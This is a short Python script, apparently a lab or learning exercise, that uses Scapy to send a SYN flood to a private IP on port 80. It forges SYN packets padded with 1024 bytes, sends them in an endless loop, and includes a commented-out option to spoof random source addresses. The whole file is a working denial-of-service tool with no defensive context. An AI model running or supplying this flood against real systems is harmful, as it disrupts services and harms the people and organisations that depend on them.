from scapy.all import *

target_ip = "10.12.0.10"
target_port = 80 # target port that will be flooded

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN

raw = Raw(b"A"*1024) # adding some data

# forge the packet
packet = ip / tcp / raw

send(packet, loop=1, verbose=0) # resend the packet several time

